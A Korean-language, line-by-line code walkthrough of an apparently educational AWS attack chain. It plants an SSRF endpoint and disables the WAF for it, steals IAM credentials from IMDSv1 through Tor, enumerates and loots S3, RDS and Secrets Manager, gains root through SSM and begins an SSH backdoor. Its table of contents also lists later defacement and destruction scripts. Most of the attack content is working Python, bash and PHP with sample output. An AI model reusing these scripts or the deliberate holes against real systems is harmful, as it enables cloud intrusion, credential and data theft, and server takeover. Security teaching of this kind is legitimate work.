# 전체 코드 분석 - 한 줄 한 줄 분석

## 📋 목차

1. [Phase 0: 취약점 생성 (119_setup_aws_vuln.sh)](#phase-0)
2. [Phase 1: IAM Credentials 탈취 (120_aws_imds_exploit.py)](#phase-1)
3. [Phase 2: AWS 인프라 열거 (121_aws_privilege_escalation.py)](#phase-2)
4. [Phase 3: 서버 장악 (122_aws_ssm_command.py)](#phase-3)
5. [Phase 4: 웹사이트 변조 (DEPLOY_HACK_V2.sh)](#phase-4)
6. [Phase 5: 사이트 토글 (TOGGLE_SITE.sh)](#phase-5)
7. [Phase 6: 사용자 차단 (LOCKDOWN_USERS.sh)](#phase-6)
8. [Phase 7: 최종 파괴 (FINAL_DESTRUCTION.sh)](#phase-7)

---

<a name="phase-0"></a>
## Phase 0: 취약점 생성 (119_setup_aws_vuln.sh)

### 목적
서버에 **의도적으로** 취약점을 생성하여 공격 가능한 환경 구축 (교육용)

### 코드 분석

#### 1. 인스턴스 정보 확인 (라인 48-75)

```bash
# Instance ID 가져오기
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
```

**의도**: AWS EC2 메타데이터 서비스(IMDS)에서 현재 인스턴스 ID 가져오기
- `169.254.169.254`: AWS IMDS 주소 (모든 EC2 인스턴스에서 접근 가능)
- `latest/meta-data/instance-id`: 인스턴스 ID 반환 (예: i-08f3cc62a529c9daf)
- `-s`: silent 모드 (진행 표시 안함)
- `2>/dev/null`: 에러 메시지 숨김

```bash
# Region 가져오기
REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region 2>/dev/null)
```

**의도**: 현재 인스턴스가 어느 리전에 있는지 확인
- `placement/region`: ap-northeast-2 같은 리전명 반환

```bash
# IAM Role 확인
IAM_ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
```

**의도**: 인스턴스에 연결된 IAM Role 이름 확인
- IAM Role이 있어야 AWS API 호출 가능
- 없으면 공격의 가치 제한됨

---

#### 2. IMDS 설정 확인 (라인 81-100)

```bash
# IMDSv1 테스트
IMDS_TEST=$(curl -s -w "\n%{http_code}" http://169.254.169.254/latest/meta-data/ 2>/dev/null)
HTTP_CODE=$(echo "$IMDS_TEST" | tail -n1)
```

**의도**: 현재 IMDSv1 접근 가능한지 테스트
- `-w "\n%{http_code}"`: HTTP 상태 코드를 출력에 추가
- `tail -n1`: 마지막 줄(HTTP 코드)만 추출

```bash
if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}[+] IMDSv1 이미 활성화됨${NC}"
    IMDS_ENABLED=true
elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo -e "${YELLOW}[*] IMDSv2만 활성화됨 (안전한 상태)${NC}"
    IMDS_ENABLED=false
```

**의도**: HTTP 응답 코드로 IMDS 상태 판단
- `200`: IMDSv1 접근 가능 (취약)
- `401/403`: IMDSv2만 허용 (안전)

---

#### 3. IMDSv1 활성화 (라인 105-160) - 치명적!

```bash
OUTPUT=$(aws ec2 modify-instance-metadata-options \
    --instance-id "$INSTANCE_ID" \
    --http-tokens optional \      # ← 핵심!
    --http-endpoint enabled \
    --region "$REGION" 2>&1)
```

**의도**: IMDSv1 활성화 (SSRF 공격에 취약하게 만들기)

**한 줄 한 줄 의미**:
- `aws ec2 modify-instance-metadata-options`: EC2 IMDS 설정 변경 명령어
- `--instance-id "$INSTANCE_ID"`: 대상 인스턴스 지정
- `--http-tokens optional`: **치명적!** IMDSv1 허용
  - `optional`: IMDSv1, IMDSv2 둘 다 허용 → SSRF 공격 가능
  - `required`: IMDSv2만 허용 → SSRF 차단 (안전)
- `--http-endpoint enabled`: IMDS 엔드포인트 활성화
- `--region "$REGION"`: 리전 지정
- `2>&1`: stderr를 stdout으로 리다이렉트 (에러 메시지 캡처)

**IMDSv1 vs IMDSv2 차이**:
```bash
# IMDSv1 (취약)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
→ 바로 credentials 반환! (인증 없음)

# IMDSv2 (안전)
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
→ 먼저 토큰 발급 필요 (SSRF로 불가능)
```

---

#### 4. SSRF 취약점 생성 (라인 178-252) - 치명적!

```bash
cat > "$HEALTH_PHP" << 'EOFPHP'
<?php
// Health Check Endpoint
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

$response = [
    'status' => 'ok',
    'timestamp' => time(),
    'server' => gethostname()
];
```

**의도**: 기본 health check 응답
- `Access-Control-Allow-Origin: *`: 모든 도메인에서 접근 허용
- `Content-Type: application/json`: JSON 응답

```php
if (isset($_GET['check'])) {
    $check_type = $_GET['check'];

    switch ($check_type) {
```

**의도**: 다양한 체크 타입 지원 (정상적인 기능처럼 보이게)

```php
case 'metadata':
    // AWS 메타데이터 (인스턴스 정보)
    // 내부 모니터링용 - IMDSv2 토큰 없이도 작동해야 함
    $url = isset($_GET['url']) ? $_GET['url'] : 'http://169.254.169.254/latest/meta-data/instance-id';
    $response['metadata'] = shell_exec("curl -s -m 5 " . escapeshellarg($url) . " 2>&1");
    break;
```

**의도**: **SSRF 취약점!** 사용자가 임의 URL 요청 가능

**한 줄 한 줄 의미**:
- `$url = isset($_GET['url']) ? $_GET['url'] : 'http://...'`:
  - `$_GET['url']`이 있으면 사용자 입력 사용
  - 없으면 기본값 사용
- `escapeshellarg($url)`:
  - Shell injection 방지 (`;`, `|`, `&&` 등 차단)
  - **하지만 SSRF는 못 막음!** URL 자체는 검증 안함
- `shell_exec("curl -s -m 5 ...")`:
  - 서버가 직접 URL 요청 (SSRF의 핵심!)
  - `-m 5`: 5초 타임아웃

**왜 위험한가?**:
```php
// 공격자 요청:
GET /api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole

// 서버 동작:
shell_exec("curl -s -m 5 'http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole'")

// 응답:
{
  "metadata": "{\"AccessKeyId\":\"ASIA...\", \"SecretAccessKey\":\"...\", ...}"
}
```

서버가 공격자 대신 IMDS에 접근 → IAM Credentials 탈취!

---

#### 5. ModSecurity 예외 추가 (라인 275-290) - 치명적!

```bash
cat >> "$MODSEC_CONF" << 'EOFMOD'

# ========================================
# Health Check Endpoint Exception
# ========================================
# 이유: 서버 모니터링 시스템이 정상 작동하려면
#       health check가 WAF 차단 없이 동작해야 함
# 승인: DevOps 팀장 (긴급)
# 날짜: 2024-11-10
# TODO: 더 안전한 방법으로 교체 필요
# ========================================

<LocationMatch "/api/health\.php">
    SecRuleEngine Off
</LocationMatch>

EOFMOD
```

**의도**: ModSecurity WAF를 `/api/health.php`에서만 비활성화

**한 줄 한 줄 의미**:
- `<LocationMatch "/api/health\.php">`: URL 패턴 매칭
  - `\.`: 정규식에서 `.`은 특수문자라 `\.`로 이스케이프
- `SecRuleEngine Off`: **모든 ModSecurity 규칙 비활성화!**
  - SSRF 차단 규칙도 비활성화
  - SQL Injection 차단 규칙도 비활성화
  - XSS 차단 규칙도 비활성화
  - **모든 보안 검사 패스!**

**정상적인 상황이라면**:
```apache
# ModSecurity가 SSRF 요청 차단
GET /api/test.php?url=http://169.254.169.254/...
→ [403 Forbidden] ModSecurity: SSRF attack detected

# 하지만 health.php는 예외
GET /api/health.php?url=http://169.254.169.254/...
→ [200 OK] 통과!
```

**왜 이런 설정을 하게 되나?**:
- 개발자: "모니터링 시스템이 health check를 5초마다 호출하는데 WAF가 차단해요!"
- 팀장: "급하니까 일단 예외 추가하고 나중에 고쳐"
- **결과**: 전체 시스템 무너짐

---

<a name="phase-1"></a>
## Phase 1: IAM Credentials 탈취 (120_aws_imds_exploit.py)

### 목적
SSRF 취약점을 이용해 AWS IAM Credentials 훔치기

### 코드 분석

#### 1. 클래스 초기화 (라인 20-41)

```python
class AWSIMDSExploit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"

        # Health check 엔드포인트 (ModSecurity 예외)
        self.health_endpoint = f"{self.base_url}/api/health.php"
```

**의도**: 타겟 서버 정보 저장
- `target_ip`: 공격 대상 서버 IP
- `health_endpoint`: 취약한 엔드포인트 URL

```python
# Tor 프록시 설정
self.session = requests.Session()
self.session.proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}
```

**의도**: Tor를 통해 익명으로 공격 (선택사항)
- `socks5h`: SOCKS5 프록시 + DNS 요청도 Tor로 전송
- `127.0.0.1:9050`: 로컬 Tor 프록시
- **주의**: Tor 없으면 에러! 교육 환경에서는 주석 처리 가능

```python
self.session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})
```

**의도**: 정상 브라우저처럼 위장
- 기본 User-Agent는 `python-requests/2.x.x` → 의심스러움
- 브라우저 User-Agent로 변경 → 로그에서 눈에 안띔

---

#### 2. SSRF 실행 함수 (라인 54-82) - 핵심!

```python
def execute_ssrf(self, url):
    """Health check 엔드포인트를 통한 SSRF"""
    try:
        params = {
            'check': 'metadata',
            'url': url
        }

        resp = self.session.get(self.health_endpoint, params=params, timeout=15)
```

**의도**: SSRF 공격 실행

**한 줄 한 줄 의미**:
- `params = {'check': 'metadata', 'url': url}`:
  - `check=metadata`: PHP의 metadata 케이스 선택
  - `url=...`: 공격자가 원하는 URL
- `self.session.get(self.health_endpoint, params=params)`:
  - 실제 요청: `GET /api/health.php?check=metadata&url=http://169.254.169.254/...`
- `timeout=15`: 15초 안에 응답 없으면 실패

```python
if resp.status_code == 200:
    try:
        data = resp.json()
        if 'metadata' in data:
            return data['metadata']
```

**의도**: JSON 응답에서 metadata 추출
- PHP가 `{"metadata": "..."}` 형식으로 응답
- `data['metadata']`에 IMDS 응답 저장됨

---

#### 3. Health Check 확인 (라인 84-112)

```python
def check_health_endpoint(self):
    resp = self.session.get(self.health_endpoint, timeout=10)
    if resp.status_code == 200:
        try:
            data = resp.json()
            if 'status' in data:
                print("[+] ✅ Health check 엔드포인트 접근 가능!")
                return True
```

**의도**: 공격 전 엔드포인트 존재 여부 확인
- `status` 필드 있으면 정상 작동
- 없으면 서버에 스크립트 설치 안된 것

---

#### 4. IMDS 접근 확인 (라인 114-139)

```python
def check_imds_access(self):
    url = "http://169.254.169.254/latest/meta-data/"
    result = self.execute_ssrf(url)

    if result and len(result) > 10:
        print("[+] ✅ IMDSv1 접근 가능!")
        print("[+] 메타데이터 엔드포인트:")
        for line in result.split('\n')[:5]:
            if line.strip():
                print(f"      {line}")
        return True
```

**의도**: SSRF로 IMDS 접근 가능한지 테스트

**응답 예시**:
```
ami-id
ami-launch-index
ami-manifest-path
hostname
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
...
```

---

#### 5. 메타데이터 수집 (라인 140-168)

```python
def get_instance_metadata(self):
    metadata_fields = {
        'instance-id': 'Instance ID',
        'instance-type': 'Instance Type',
        'local-ipv4': 'Private IP',
        'public-ipv4': 'Public IP',
        'placement/availability-zone': 'AZ',
        'placement/region': 'Region',
        'security-groups': 'Security Groups',
        'hostname': 'Hostname'
    }

    for field, label in metadata_fields.items():
        url = f"http://169.254.169.254/latest/meta-data/{field}"
        result = self.execute_ssrf(url)
```

**의도**: 인스턴스 정보 수집
- `instance-id`: i-08f3cc62a529c9daf
- `instance-type`: t2.micro
- `local-ipv4`: 172.31.x.x (내부 IP)
- `public-ipv4`: 52.79.240.83 (외부 IP)
- `placement/region`: ap-northeast-2
- `security-groups`: default

**왜 필요한가?**:
- 타겟 서버 환경 파악
- 다른 인스턴스로 횡적 이동 계획
- 보고서 작성용

---

#### 6. IAM Role 확인 (라인 169-184) - 중요!

```python
def check_iam_role(self):
    url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    role_name = self.execute_ssrf(url)

    if role_name and role_name != '404 - Not Found' and len(role_name) > 0:
        print(f"[+] ✅ IAM Role 발견: {role_name}")
        return role_name.strip()
    else:
        print("[-] IAM Role이 연결되어 있지 않습니다")
        return None
```

**의도**: IAM Role 이름 획득

**IMDS 응답**:
```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ MyEC2Role
```

**IAM Role이 없으면?**:
- Credentials 탈취 불가
- AWS API 호출 불가
- 공격 가치 제한됨

---

#### 7. Credentials 탈취 (라인 186-228) - 핵심!

```python
def steal_credentials(self, role_name):
    url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
    creds_json = self.execute_ssrf(url)
```

**의도**: IAM Credentials 전체 탈취

**SSRF 요청**:
```
GET /api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
```

**IMDS 응답 (실제 예시)**:
```json
{
  "Code": "Success",
  "LastUpdated": "2025-11-16T04:05:33Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIASO4TYV4OK2MJVZDV",
  "SecretAccessKey": "7H1nyRK6iZ80K2Tthpq7RhQVGCD+HNyjcsg4QfIE",
  "Token": "IQoJb3JpZ2luX2VjEMf//////////wEaDmFwLW5vcnRoZWFzdC0yIkcwRQIgf...",
  "Expiration": "2025-11-16T11:05:33Z"
}
```

```python
try:
    creds = json.loads(creds_json)

    if 'AccessKeyId' in creds and 'SecretAccessKey' in creds:
        self.credentials = creds

        print("[+] ✅✅✅ AWS 자격 증명 탈취 성공!")
        print(f"AccessKeyId:     {creds.get('AccessKeyId')}")
        print(f"SecretAccessKey: {creds.get('SecretAccessKey')[:30]}...")
        print(f"Token:           {creds.get('Token')[:30]}...")
```

**의도**: JSON 파싱 후 Credentials 확인

**한 줄 한 줄 의미**:
- `json.loads(creds_json)`: JSON 문자열 → Python dict
- `if 'AccessKeyId' in creds`: 유효한 credentials인지 확인
- `self.credentials = creds`: 저장
- `[:30]...`: 보안상 일부만 출력

**이것으로 할 수 있는 것**:
```bash
export AWS_ACCESS_KEY_ID="ASIASO4TYV4OK2MJVZDV"
export AWS_SECRET_ACCESS_KEY="7H1nyRK6iZ80K2Tthpq7RhQVGCD+HNyjcsg4QfIE"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEMf..."

# 이제 AWS CLI 사용 가능!
aws s3 ls  # S3 버킷 나열
aws ec2 describe-instances  # EC2 인스턴스 나열
aws secretsmanager get-secret-value --secret-id prod-db-password  # 비밀 값 탈취
```

---

#### 8. Credentials 저장 (라인 229-281)

```python
def save_credentials(self):
    timestamp = int(time.time())

    # AWS CLI 형식
    aws_config = f"""# AWS 자격 증명 (탈취)
# 탈취 시각: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# 대상: {self.target_ip}
# 방법: health.php SSRF → IMDSv1
#
# 사용법 1: 환경 변수
export AWS_ACCESS_KEY_ID="{self.credentials.get('AccessKeyId')}"
export AWS_SECRET_ACCESS_KEY="{self.credentials.get('SecretAccessKey')}"
export AWS_SESSION_TOKEN="{self.credentials.get('Token')}"
"""

    filename = f"aws_stolen_{timestamp}.sh"
    with open(filename, 'w') as f:
        f.write(aws_config)
```

**의도**: 나중에 쉽게 사용할 수 있도록 파일로 저장

**생성된 파일 (aws_stolen_1731767234.sh)**:
```bash
# AWS 자격 증명 (탈취)
# 탈취 시각: 2025-11-16 13:05:33
# 대상: 52.79.240.83
# 방법: health.php SSRF → IMDSv1

# 사용법 1: 환경 변수
export AWS_ACCESS_KEY_ID="ASIASO4TYV4OK2MJVZDV"
export AWS_SECRET_ACCESS_KEY="7H1nyRK6iZ80K2Tthpq7RhQVGCD+HNyjcsg4QfIE"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEMf..."

# 만료 시각: 2025-11-16T11:05:33Z
```

**사용법**:
```bash
# 터미널에서 실행
source aws_stolen_1731767234.sh

# 이제 AWS 명령어 사용 가능
aws sts get-caller-identity
```

---

<a name="phase-2"></a>
## Phase 2: AWS 인프라 열거 (121_aws_privilege_escalation.py)

### 목적
탈취한 Credentials로 AWS 리소스 전체 탐색 및 민감 정보 수집

### 코드 분석

#### 1. Boto3 세션 초기화 (라인 22-59)

```python
class AWSPrivilegeEscalation:
    def __init__(self, access_key=None, secret_key=None, session_token=None, region='ap-northeast-2'):
        if access_key and secret_key:
            self.access_key = access_key
            self.secret_key = secret_key
            self.session_token = session_token
        else:
            # 환경 변수에서 가져오기
            self.access_key = os.getenv('AWS_ACCESS_KEY_ID')
            self.secret_key = os.getenv('AWS_SECRET_ACCESS_KEY')
            self.session_token = os.getenv('AWS_SESSION_TOKEN')
```

**의도**: Credentials 로드 (파라미터 또는 환경 변수)

```python
# Boto3 클라이언트 초기화
self.session = boto3.Session(
    aws_access_key_id=self.access_key,
    aws_secret_access_key=self.secret_key,
    aws_session_token=self.session_token,
    region_name=self.region
)
```

**의도**: boto3로 AWS API 호출 준비
- `boto3.Session`: AWS 클라이언트 세션 생성
- 이제 `self.session.client('ec2')` 같은 호출 가능

---

#### 2. IAM 신원 확인 (라인 69-96)

```python
def get_caller_identity(self):
    sts = self.session.client('sts')
    identity = sts.get_caller_identity()
```

**의도**: 현재 AWS 계정 및 권한 확인

**STS (Security Token Service)**:
- AWS 신원 확인 서비스
- `get_caller_identity()`: 누구인지 확인

**응답 예시**:
```json
{
  "UserId": "AROAISO4TYV4ONQEXAMPLE:i-08f3cc62a529c9daf",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/MyEC2Role/i-08f3cc62a529c9daf"
}
```

**ARN 분석**:
```
arn:aws:sts::123456789012:assumed-role/MyEC2Role/i-08f3cc62a529c9daf
│   │   │   │              │            │         │
│   │   │   └─ Account ID  │            │         └─ Session name (Instance ID)
│   │   └───── Service     │            └─────────── Role name
│   └─────────── Partition │
└─────────────── ARN prefix└──────────── Resource type
```

```python
if ':assumed-role/' in identity['Arn']:
    role_name = identity['Arn'].split(':assumed-role/')[1].split('/')[0]
    print(f"[+] Role Name: {role_name}")
```

**의도**: Role 이름 추출
- `split(':assumed-role/')[1]`: `MyEC2Role/i-08f3cc62a529c9daf`
- `split('/')[0]`: `MyEC2Role`

---

#### 3. EC2 인스턴스 열거 (라인 97-151)

```python
def enumerate_ec2(self):
    ec2 = self.session.client('ec2', region_name=self.region)
    response = ec2.describe_instances()
```

**의도**: 모든 EC2 인스턴스 정보 가져오기

**API 호출**:
```python
# AWS API 호출
GET https://ec2.ap-northeast-2.amazonaws.com/
?Action=DescribeInstances
&Version=2016-11-15
```

**응답 구조**:
```json
{
  "Reservations": [
    {
      "Instances": [
        {
          "InstanceId": "i-08f3cc62a529c9daf",
          "InstanceType": "t2.micro",
          "State": {"Name": "running"},
          "PrivateIpAddress": "172.31.32.100",
          "PublicIpAddress": "52.79.240.83",
          "KeyName": "my-key-pair",
          "Tags": [
            {"Key": "Name", "Value": "Web Server"},
            {"Key": "Environment", "Value": "Production"}
          ]
        }
      ]
    }
  ]
}
```

```python
for reservation in response['Reservations']:
    for instance in reservation['Instances']:
        inst_info = {
            'InstanceId': instance['InstanceId'],
            'InstanceType': instance['InstanceType'],
            'State': instance['State']['Name'],
            'PrivateIp': instance.get('PrivateIpAddress', 'N/A'),
            'PublicIp': instance.get('PublicIpAddress', 'N/A'),
            'KeyName': instance.get('KeyName', 'N/A')
        }
```

**의도**: 각 인스턴스 정보 추출
- `instance.get('PrivateIpAddress', 'N/A')`: 없으면 'N/A'

```python
# Tags 추출
tags = {}
if 'Tags' in instance:
    for tag in instance['Tags']:
        tags[tag['Key']] = tag['Value']
inst_info['Tags'] = tags
```

**의도**: 태그 정보 저장
- Name: Web Server
- Environment: Production

**왜 중요한가?**:
- **횡적 이동 (Lateral Movement)**: 다른 서버로 침투
- Private IP로 내부 네트워크 공격
- Key pair 이름으로 SSH 키 추측

---

#### 4. S3 버킷 탐색 (라인 152-207) - 중요!

```python
def enumerate_s3(self):
    s3 = self.session.client('s3')
    response = s3.list_buckets()
```

**의도**: 모든 S3 버킷 나열

**API 응답**:
```json
{
  "Buckets": [
    {"Name": "my-app-backup-bucket", "CreationDate": "2025-01-01T00:00:00Z"},
    {"Name": "my-app-config-bucket", "CreationDate": "2025-01-02T00:00:00Z"},
    {"Name": "my-app-logs-bucket", "CreationDate": "2025-01-03T00:00:00Z"}
  ]
}
```

```python
for bucket in response['Buckets']:
    bucket_name = bucket['Name']

    try:
        # 버킷 내용 리스트 시도
        objects = s3.list_objects_v2(Bucket=bucket_name, MaxKeys=5)
```

**의도**: 각 버킷 접근 권한 테스트
- `list_objects_v2`: 버킷 내용 나열
- `MaxKeys=5`: 5개만 가져오기 (빠른 테스트)

```python
if 'Contents' in objects:
    print(f"      ✓ 읽기 가능 ({objects['KeyCount']} objects)")

    # 흥미로운 파일 찾기
    for obj in objects['Contents']:
        key = obj['Key']
        if any(keyword in key.lower() for keyword in
               ['key', 'secret', 'password', 'credential', 'config', '.env', 'backup']):
            print(f"      🎯 관심 파일: {key}")
```

**의도**: 민감한 파일 찾기

**발견 가능한 것**:
```
my-app-config-bucket/
  ├── .env                           ← 🎯 DB 비밀번호, API 키
  ├── config/database.yml            ← 🎯 DB 접속 정보
  └── secrets/aws_credentials.json   ← 🎯 추가 AWS 키

my-app-backup-bucket/
  ├── mysql-dump-2025-11-16.sql     ← 🎯 전체 DB 덤프
  └── user-data-backup.tar.gz       ← 🎯 사용자 데이터

my-app-logs-bucket/
  └── application.log                ← API 키, 세션 토큰
```

**S3 파일 다운로드**:
```python
# 추가 공격: 파일 다운로드
s3.download_file('my-app-config-bucket', '.env', 'stolen.env')
```

---

#### 5. RDS 데이터베이스 열거 (라인 208-261)

```python
def enumerate_rds(self):
    rds = self.session.client('rds', region_name=self.region)
    response = rds.describe_db_instances()
```

**의도**: 모든 RDS 인스턴스 정보 가져오기

**응답 예시**:
```json
{
  "DBInstances": [
    {
      "DBInstanceIdentifier": "prod-mysql-db",
      "Engine": "mysql",
      "EngineVersion": "8.0.35",
      "Endpoint": {
        "Address": "prod-mysql-db.c9dnxz7xyzab.ap-northeast-2.rds.amazonaws.com",
        "Port": 3306
      },
      "MasterUsername": "admin",
      "PubliclyAccessible": true
    }
  ]
}
```

```python
db_info = {
    'DBInstanceIdentifier': db['DBInstanceIdentifier'],
    'Engine': db['Engine'],
    'EngineVersion': db['EngineVersion'],
    'Endpoint': db.get('Endpoint', {}).get('Address', 'N/A'),
    'Port': db.get('Endpoint', {}).get('Port', 'N/A'),
    'MasterUsername': db['MasterUsername'],
    'PubliclyAccessible': db['PubliclyAccessible']
}
```

**의도**: DB 접속 정보 추출

```python
if db_info['PubliclyAccessible']:
    print(f"      🎯 공격 가능: 외부 접근 가능한 DB!")
```

**왜 위험한가?**:
```bash
# S3에서 .env 파일 다운로드 → DB 비밀번호 획득
DB_HOST=prod-mysql-db.c9dnxz7xyzab.ap-northeast-2.rds.amazonaws.com
DB_PORT=3306
DB_USER=admin
DB_PASSWORD=SuperSecret123!

# MySQL 직접 접속
mysql -h prod-mysql-db.c9dnxz7xyzab.ap-northeast-2.rds.amazonaws.com \
      -u admin -pSuperSecret123!

# 전체 DB 덤프
mysqldump --all-databases > stolen_db.sql
```

---

#### 6. Secrets Manager 탈취 (라인 262-320) - 치명적!

```python
def enumerate_secrets(self):
    secrets_mgr = self.session.client('secretsmanager', region_name=self.region)
    response = secrets_mgr.list_secrets()
```

**의도**: 저장된 모든 비밀 나열

**응답 예시**:
```json
{
  "SecretList": [
    {
      "Name": "prod/db/password",
      "ARN": "arn:aws:secretsmanager:ap-northeast-2:123456789012:secret:prod/db/password-AbCdEf"
    },
    {
      "Name": "prod/stripe/api-key",
      "ARN": "arn:aws:secretsmanager:ap-northeast-2:123456789012:secret:prod/stripe/api-key-XyZaBc"
    }
  ]
}
```

```python
for secret in response['SecretList']:
    # 비밀 값 가져오기 시도
    try:
        secret_value = secrets_mgr.get_secret_value(SecretId=secret['Name'])

        if 'SecretString' in secret_value:
            print(f"      🎯 내용: {secret_value['SecretString'][:100]}...")
```

**의도**: 비밀 값 실제로 가져오기

**실제 비밀 값 예시**:
```json
// prod/db/password
{
  "username": "admin",
  "password": "MyDBPassword123!",
  "engine": "mysql",
  "host": "prod-mysql-db.c9dnxz7xyzab.ap-northeast-2.rds.amazonaws.com",
  "port": 3306
}

// prod/stripe/api-key
{
  "api_key": "sk_live_51H7xyzABC123...",
  "publishable_key": "pk_live_51H7xyzDEF456..."
}

// prod/jwt/secret
{
  "secret": "my-super-secret-jwt-key-2024"
}
```

**이것으로 할 수 있는 것**:
- **DB 비밀번호** → 데이터베이스 전체 접근
- **Stripe API 키** → 결제 시스템 공격, 환불 처리, 금전 탈취
- **JWT Secret** → 임의 사용자로 로그인, 관리자 권한 획득

---

<a name="phase-3"></a>
## Phase 3: 서버 장악 (122_aws_ssm_command.py)

### 목적
AWS Systems Manager로 서버에 직접 명령 실행 → Root 권한 획득

### 코드 분석

#### 1. SSM 클라이언트 초기화 (라인 18-33)

```python
class AWSServerTakeover:
    def __init__(self, access_key, secret_key, session_token, region='ap-northeast-2'):
        self.session = boto3.Session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            aws_session_token=session_token,
            region_name=region
        )

        self.ssm = self.session.client('ssm')
        self.ec2 = self.session.client('ec2')
```

**의도**: SSM 및 EC2 클라이언트 생성
- `ssm`: Systems Manager API 호출용
- `ec2`: 인스턴스 정보 조회용

---

#### 2. 타겟 인스턴스 찾기 (라인 58-105)

```python
def find_target_instance(self, target_ip=None):
    response = self.ec2.describe_instances()

    for reservation in response['Reservations']:
        for instance in reservation['Instances']:
            instance_id = instance['InstanceId']
            public_ip = instance.get('PublicIpAddress', 'N/A')

            if target_ip:
                if public_ip == target_ip:
                    self.instance_id = instance_id
                    return True
```

**의도**: IP로 인스턴스 ID 찾기
- Phase 1에서 `52.79.240.83` IP 알아냄
- 여기서 `i-08f3cc62a529c9daf` ID 매칭

---

#### 3. SSM 접근 확인 (라인 106-139) - 중요!

```python
def check_ssm_access(self):
    response = self.ssm.describe_instance_information(
        Filters=[
            {
                'Key': 'InstanceIds',
                'Values': [self.instance_id]
            }
        ]
    )
```

**의도**: SSM Agent 설치 여부 확인

**SSM (Systems Manager)**:
- AWS가 제공하는 서버 관리 도구
- **SSM Agent**: EC2 인스턴스에 설치된 에이전트
- SSM Agent 있으면 → 원격 명령 실행 가능

```python
if response['InstanceInformationList']:
    info = response['InstanceInformationList'][0]
    print(f"[+] ✅ SSM 관리 대상 인스턴스")
    print(f"    Platform: {info.get('PlatformType', 'N/A')}")
    print(f"    Ping Status: {info.get('PingStatus', 'N/A')}")
```

**응답 예시**:
```json
{
  "InstanceInformationList": [
    {
      "InstanceId": "i-08f3cc62a529c9daf",
      "PingStatus": "Online",
      "PlatformType": "Linux",
      "PlatformName": "Amazon Linux",
      "AgentVersion": "3.2.582.0"
    }
  ]
}
```

**PingStatus: Online** → 지금 명령 실행 가능!

---

#### 4. 원격 명령 실행 (라인 140-187) - 핵심!

```python
def execute_command(self, command, comment=""):
    response = self.ssm.send_command(
        InstanceIds=[self.instance_id],
        DocumentName='AWS-RunShellScript',
        Parameters={
            'commands': [command]
        },
        Comment=comment
    )
```

**의도**: SSM으로 Shell 명령 실행

**한 줄 한 줄 의미**:
- `InstanceIds=[self.instance_id]`: 대상 인스턴스
- `DocumentName='AWS-RunShellScript'`: SSM 문서 (쉘 스크립트 실행)
- `Parameters={'commands': [command]}`: 실행할 명령어
- `Comment=comment`: 로그용 설명

**AWS API 호출**:
```json
POST https://ssm.ap-northeast-2.amazonaws.com/
{
  "InstanceIds": ["i-08f3cc62a529c9daf"],
  "DocumentName": "AWS-RunShellScript",
  "Parameters": {
    "commands": ["whoami"]
  }
}
```

```python
command_id = response['Command']['CommandId']
print(f"[+] Command ID: {command_id}")

# 명령 완료 대기
time.sleep(3)

# 결과 가져오기
output = self.ssm.get_command_invocation(
    CommandId=command_id,
    InstanceId=self.instance_id
)

stdout = output.get('StandardOutputContent', '')
stderr = output.get('StandardErrorContent', '')
```

**의도**: 명령 실행 결과 확인

**실행 흐름**:
1. `send_command()` → AWS에 명령 전송
2. AWS → EC2 인스턴스의 SSM Agent에 전달
3. SSM Agent → Shell에서 명령 실행
4. 결과 → AWS로 전송
5. `get_command_invocation()` → 결과 가져오기

**예시**:
```python
# 명령 실행
execute_command("whoami")

# 결과
[+] Command ID: abc123...
[+] ✅ 명령 성공

출력:
root
```

---

#### 5. 권한 상승 (라인 188-232)

```python
def privilege_escalation(self):
    # 현재 사용자 확인
    success, output = self.execute_command("whoami")

    if "root" in output:
        print("[+] ✅ 이미 root 권한!")
        return True
```

**의도**: SSM이 root로 실행되는지 확인

**SSM Agent 동작 방식**:
```bash
# SSM Agent는 보통 root로 실행됨
ps aux | grep ssm-agent
root      1234  0.0  1.0  /usr/bin/amazon-ssm-agent

# 따라서 SSM으로 실행하는 명령도 root
ssm.send_command("whoami")  # → root
```

**웹 SSRF → Root 권한까지**:
1. 웹사이트 SSRF 취약점
2. IAM Credentials 탈취
3. SSM API 호출
4. **Root로 명령 실행!**

---

#### 6. 백도어 생성 (라인 233-288)

##### SSH 백도어

```python
ssh_key = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@attacker"""

command = f"""
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo '{ssh_key}' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
"""

self.execute_command(command, "Create SSH backdoor")
```

**의도**: 공격자 SSH 공개키 추가

**작동 원리**:
```bash
# 공격자 로컬에서 SSH 키 생성 (이미 함)
